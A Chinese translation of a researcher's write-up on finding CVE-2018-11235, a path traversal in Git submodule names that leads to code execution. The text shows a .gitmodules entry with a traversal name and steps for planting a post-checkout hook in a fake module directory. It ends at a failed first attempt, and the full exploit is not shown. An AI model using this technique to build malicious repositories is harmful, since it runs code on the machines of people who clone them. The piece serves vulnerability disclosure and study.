# Git远程代码执行漏洞（CVE-2018-11235）的详细分析
|
##### 译文声明
本文是翻译文章，文章来源：https://staaldraad.github.io/
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 一、概述
最近，我在研究一个包含许多子模块的Git仓库（Repository）。在研究过程中，我意识到自己并不清楚子模块（Submodules）是如何工作的，因此决定深入研究子模块的工作模式，以对其有更清晰的理解。但就在这个研究过程中，我发现了子模块系统的一个漏洞，当子模块被初始化时，将会导致Git中的远程代码执行（RCE）。针对这一漏洞，我复制了一台恶意软件库的主机，并在该主机上成功利用了这一漏洞。最后，我发现并向GitHub的Bounty
Hunters项目提交了该漏洞（ 
），并获得了CVE-2018-11235的漏洞编号（
 ） 。  
在本文中，我将详细描述发现漏洞的过程，并详细分析利用这一漏洞的步骤。这可能是我寻找漏洞以来所发现的最受欢迎的一个漏洞。如果要让我概述发现这一漏洞的过程，那么必须要认真研究，再加上一点点运气，最后才能得到代码执行漏洞。
## 二、关于子模块
Git允许用户将外部仓库包含到自己的仓库之中，从而可以轻松地包含外部依赖关系，并且能够自动跟踪其发生的更改。根据Git-scm的介绍（
），我们知道：子模块（Submodule）是嵌入在另一个仓库内的仓库。子模块具有其自己的历史记录（History）。它所嵌入的仓库称为超级项目（Superproject）。  
如果大家想要深入研究子模块，以下这些资源可以作为参考：  
为了理解子模块是如何工作的，我们添加一个基本的子模块，并查看我们对仓库所做的更改。要将子模块添加到仓库，我们只需要使用git submodule
add命令。这一过程需要复制外部仓库，并为用户设置一些配置选项。每个子模块都有一个名称和一个路径，该路径用于跟踪子模块，同时也是仓库中子模块的存储位置。  
如果我们添加一个外部子模块：
    git submodule add https://github.com/staaldraad/repository.git mysubmodule
将会创建如下文件：  
（1）mysubmodule/：将要复制的子模块的仓库路径；  
（2）.gitmodules：包含有关子模块的初始化信息（如果该文件不存在，将会自动创建）；  
（3）$GIT_DIR/modules/mysubmodule：该文件夹包含子模块的Git目录（与我们已知的.git目录相同）；  
（4）$GIT_DIR/config：修改后的.git/config文件，其中包含对所有子模块的引用。  
将子模块添加到仓库，并将更改推送到远程设备之后，我们可能会注意到子模块的内容实际上没有添加到远程设备之中。在.gitmodules文件中包含了有关子模块的信息，这些信息将会用于对仓库中任何复制的子模块进行初始化。  
为了在本地复制的仓库中对子模块进行初始化，我们需要在复制过程中使用以下命令来进行指定：
    git clone --recurse-submodules https://github.com/staaldraad/repository.git
或者也可以在现有的仓库中，执行以下操作：
    git submodule update --init
.gitmodules文件在子模块中将起到重要的作用，并且该文件是在我们的控制之下。仔细研究.gitmodules文件，我们会发现如下内容：
    [submodule "mysubmodule"]
            path = mysubmodule
            url = https://github.com/staaldraad/repository.git
而就是在这里，我有一丝不寻常的预感，并且开始寻找漏洞。
## 三、漏洞发现过程
###  3.1 初步尝试
通过查看.gitmodules文件，我们注意到其中出现了两次mysubmodule，一次是在子模块名称中，另一次是在路径之中。而默认情况下，除非使用了—name参数指定名称，否则子模块名称和子模块路径会是相同的。此外，我们还注意到，子模块名称将用于为子模块创建.git目录，这一目录的路径最终为$GIT_DIR/modules/mysubmodule。在这里，我不禁产生了疑问，如果子模块名称就是一个路径呢？为了验证我是否可以操纵所使用的文件路径，我对.gitmodules文件中的子模块名称进行了修改。  
修改后的.gitmodules文件如下：
    [submodule "../../submodule"]
            path = mysubmodule
            url = https://github.com/staaldraad/repository.git
我提交了修改，并完成了复制目录这一过程。由于我修改了子模块名称，直接导致子模块仓库在主仓库中被创建，而不是在其所属的.git/modules中创建。
    git clone --recurse-submodules https://github.com/staaldraad/repository.git
    ...
    cd repository
    ls -l 
    drwxrwxr-x. 2 staaldraad staaldraad    40 May  3 13:26 submodule
    -rw-rw-r--. 1 staaldraad staaldraad     3 May  3 13:26 README.md
    drwxrwxr-x. 2 staaldraad staaldraad    40 May  3 13:26 mysubmodule
    ls -l submodule                                                                                                             
    total 28
    drwxrwxr-x. 2 staaldraad staaldraad    40 May  3 13:26 branches
    -rw-rw-r--. 1 staaldraad staaldraad   293 May  3 13:26 config
    -rw-rw-r--. 1 staaldraad staaldraad    73 May  3 13:26 description
    -rw-rw-r--. 1 staaldraad staaldraad    41 May  3 13:26 HEAD
    drwxrwxr-x. 2 staaldraad staaldraad   240 May  3 13:26 hooks
    -rw-rw-r--. 1 staaldraad staaldraad 11120 May  3 13:26 index
    drwxrwxr-x. 2 staaldraad staaldraad    60 May  3 13:26 info
    drwxrwxr-x. 3 staaldraad staaldraad    80 May  3 13:26 logs
    drwxrwxr-x. 4 staaldraad staaldraad    80 May  3 13:26 objects
    -rw-rw-r--. 1 staaldraad staaldraad   107 May  3 13:26 packed-refs
    drwxrwxr-x. 5 staaldraad staaldraad   100 May  3 13:26 refs
结果证明，在子模块复制函数中，存在目录遍历漏洞，我们现在可以借助这一漏洞在任意位置进行写入。但遗憾的是，我们还不能控制写入的数据。所有创建的内容都来源于Git，但我们希望进行代码执行，这时Git仓库就显得毫无用处了。因此，我试图使用符号链接，对不同的位置尝试进行写入，但除了能够覆盖现有的文件夹之外，似乎并没有太大作用。  
于是，我决定后退一步，先不考虑完全控制写入的内容，而是分析一下Git自身的原理以及如何从Git执行代码，这时我想到了Git钩子（Git Hook，
 ）。
###  3.2 Git钩子
Git钩子具体分为客户端钩子和服务端钩子。这些钩子是在Git工作流中发生预定义事件时触发的简单可执行脚本（例如Bash等）。最常见的例子就是预提交钩子，用于验证提交中是否包含敏感数据。这些钩子似乎可以作为代码执行的一个有效途径，但不幸的是，钩子位于$GIT_DIR/hooks/中，这也就意味着它们永远不会存储在远程的Git仓库中，并且不会成为复制过程中被复制的一个部分。  
之所以这样设定，是有原因的——如果钩子存储在实际的Git工作树中，就可以很容易地创建一个具有恶意客户端钩子的仓库，并且任何复制该仓库的用户都会执行钩子，这显然不是一个理想的状况。  
由于子模块只是一个外部的Git仓库，所以子模块也可以具有钩子，这些钩子会存储在$GIT_DIR/modules/modulename/hooks目录下。这时我有了一个想法，如果使用我们的子模块目录遍历漏洞，来创建并触发$GIT_DIR之外的一个钩子是否可行？
###  3.3 重新回到遍历漏洞
由于这一遍历漏洞的存在，允许我们的子模块仓库位于$GIT_DIR之外，所以我们可以将其添加到工作树，并提交到远程。这也就意味着，它将被包含在任何复制的Git之中，理论上当我们对子模块进行任何更改时，都会触发这一钩子。  
考虑到上述原理，我们进行了如下步骤。  
（1）添加一个子模块：
    git submodule add https://github.com/staaldraad/repository.git submod
（2）创建一个伪造Git目录，用于我们的遍历：
    mkdir -p fakegit/modules
（3）创建一个Git钩子：
    vim fakegit/modules/submod/hooks/post-checkout
    chmod +x !$
（4）修改.gitmodules，使其包含遍历（新模块名称为../../fakegit/modules/submod）  
（5）提交所有内容：
    git add .
    git commit -m "msg"
    git push origin master
我们的思路是，当仓库被复制时，由于fakegit/modules/submod看起来似乎是一个有效的子模块仓库，并且当子模块git submodule
update
—init执行时，Git将会使用fakegit/modules/submod作为路径，而不是$GIT_DIR/modules/submod。由于其中包含一个钩子，所以在检查完成后将会执行钩子。  
思路非常完美，但实际却遇到了失败。
    Submodule '../../fakegit/modules/submod' (https://github.com/staaldraad/repository.git) registered for path 'submod'
    Cloning into '/tmp/c/v/subs/submod'...
    fatal: /tmp/c/v/subs/.git/modules/../../fakegit/modules/submod already exists
    fatal: clone of 'https://github.com/staaldraad/repository.git' into submodule path '/tmp/c/v/subs/submod' failed
    Failed to clone 'submod'. Retry scheduled